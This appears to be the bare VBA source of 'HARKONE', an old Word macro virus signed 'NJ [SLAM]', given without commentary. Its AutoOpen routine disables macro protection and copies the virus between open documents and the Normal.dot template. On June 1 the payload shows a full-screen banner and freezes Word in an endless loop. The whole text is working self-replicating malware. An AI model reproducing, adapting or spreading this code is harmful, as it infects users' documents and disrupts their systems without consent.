   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim J$
   On Error GoTo -1: On Error GoTo Finish
   WordBasic.DisableAutoMacros 0
   J$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If J$ = "normal.dot" Then
       If VI = 1 Then
           GoTo Finish
       Else
           InfectDOC
       End If
   Else
       If VI2 = 1 Then
           GoTo Finish
       Else
           InfectGlobal
       End If
   End If
   Finish:
   WordBasic.Call "HARKONE"
   End Sub

   Private Function VI()
   Dim i
   VI = 0
   If WordBasic.CountMacros(1) > 0 Then
       For i = 1 To WordBasic.CountMacros(1)
                   If WordBasic.[MacroName$](i, 1) = "HARKONE" Then
                                VI = 1
           End If
       Next i
   End If
   End Function

   Private Function VI2()
   Dim i
   VI2 = 0
   If WordBasic.CountMacros(0) > 0 Then
       For i = 1 To WordBasic.CountMacros(0)
                   If WordBasic.[MacroName$](i, 0) = "HARKONE" Then
                                VI2 = 1
           End If
       Next i
   End If
   End Function

   Private Sub InfectDOC()
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.MacroCopy "Global:HARKONE", WordBasic.[FileName$]() + ":HARKONE"
   WordBasic.FileSaveAll 1, 1
   End Sub

   Private Sub InfectGlobal()
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":HARKONE", "Global:HARKONE"
   WordBasic.FileSaveAll 1, 0
   End Sub

   Attribute VB_Name = "HARKONE"

   Public Sub MAIN()
   If WordBasic.Day(WordBasic.Now()) = 1 And WordBasic.Month(WordBasic.Now()) = 6 Then
       WordBasic.FileNew
       WordBasic.ToggleFull
       WordBasic.DocMaximize
       WordBasic.Font "Imprint MT Shadow"
       WordBasic.FontSize 60
       WordBasic.Bold
       WordBasic.Insert "HARKONE"
       WordBasic.StartOfLine
       WordBasic.CharRight 1, 1
       WordBasic.FormatFont Points:="48", Color:=6
       WordBasic.EndOfLine
       WordBasic.InsertPara
       WordBasic.InsertPara
       WordBasic.FontSize 48
       WordBasic.Insert "NJ [SLAM]"
   HangOn:
   GoTo HangOn
   End If
   End Sub
